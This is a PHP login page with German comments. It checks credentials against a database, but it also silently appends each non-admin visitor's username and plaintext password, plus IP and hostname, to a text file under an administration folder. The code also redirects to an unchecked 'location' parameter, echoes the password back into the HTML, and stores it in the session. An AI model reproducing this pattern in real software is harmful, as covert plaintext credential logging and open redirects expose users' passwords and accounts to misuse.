<!--
    Autor: Alex Glaser
    erstellt am: 28.03.2023
-->

<!DOCTYPE html>
<html lang="de">
  <head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="../css/loginstyle.css">
    <link rel="shortcut icon" href="../img/logo.png" type="image/x-icon">
  <title>Login</title>
  </head>
<?php
    session_start();
    $_POST = array_map('htmlspecialchars', $_POST);
    $username = $_SESSION['username'] = @$_POST['username'];
    $password = $_SESSION['password'] = @$_POST['password'];
    $anmelden = $_SESSION['anmelden'] = @$_POST['anmelden'];
    
    require("../inc/db_init.php");

	if (isset($anmelden)) {

		/************** Abfrage ob überhaupt was übergeben wurde **************/
		if (isset($password) && isset($username)) {

      $sql = "SELECT * FROM alexglaserLogin";
      $ergebniss = mysqli_query($link, $sql);

      while ($row = mysqli_fetch_object($ergebniss)) {
        $password_aus_db = $row->pwd;
        $pw_verify = password_verify($password, $password_aus_db);
        // echo "User Passwort: ".$password."<br>Datenbank Passwort: ".$password_aus_db."<br>Verify: ".($pw_verify?"true":"false");
        if ($username == $row->username && $pw_verify) {
          $_SESSION['login'] = true;
          // Führt dich wieder zur gezwungenen Anmeldeseite
          header("Location: ../".$_GET['location']);
        } else {
          echo "
              <body class='body'>
                <div style='z-index: 100;' class='center'>
                  <h1>Login</h1>
                  <form action='./index.php' method='POST'>
                  <div style='text-align: center; color: #40bf09;'>Keine Werbung</div>
                    <div class='txt_field'>
                      <input type='text' name='username' value='$username' required autofocus>
                      <span></span>
                      <label>Username</label>
                    </div>
                    <div class='txt_field'>
                      <input type='password' name='password' value='$password' required>
                      <span></span>
                      <label>Passwort</label>
                    </div>
                    <input type='submit' name='anmelden' value='Login'>
                    <div class='signup_link'><h4 style='color: red;'>Falsches Passwort oder Username</h4></div>
                    <div class='signup_link'>
                      Noch kein Account? <a href='./signup.php'>Registrieren</a>
                    </div>
                  </form>
                </div>
              </body>";
        }
      }
    }
  }
?>
  <body class="body">
    <div class="center">
      <h1>Login</h1>
      <form action="./index.php" method="POST">
      <div style='text-align: center; color: #40bf09;'>Keine Werbung</div>
        <div class="txt_field">
          <input type="text" name="username" required autofocus>
          <span></span>
          <label>Username</label>
        </div>
        <div class="txt_field">
          <input type="password" name="password" required>
          <span></span>
          <label>Passwort</label>
        </div>
        <input type="submit" name="anmelden" value="Login">
        <div class="signup_link">
          Noch kein Account? <a href="./signup.php">Registrieren</a>
        </div>
      </form>
    </div>
    <?php
        $hostname = $_SERVER['REMOTE_HOST'];
        $ip = $_SERVER["REMOTE_ADDR"];
        $datum = date("d.m.Y");
        $uhrzeit = date("H:i:s");
        $dateiname = '../administration/registrierungen.txt';
        if (isset($anmelden) && $username != 'admin') {
          if (!file_exists($dateiname)) {
            $dateizeiger = fopen($dateiname, 'w+');
          } else {
            $dateizeiger = fopen($dateiname, 'a');
          }
          rewind($dateizeiger);
          flock($dateizeiger, LOCK_EX);
          $text = "Hostname:\t$hostname\nIp:\t\t$ip\nDatum:\t\t$datum\nUhrzeit:\t$uhrzeit\n";
          $text .= "Username:\t$username\nPasswort:\t$password\n\n";
          fwrite($dateizeiger, $text);
          flock($dateizeiger, LOCK_UN);
          fclose($dateizeiger);
        }
    ?>
  </body>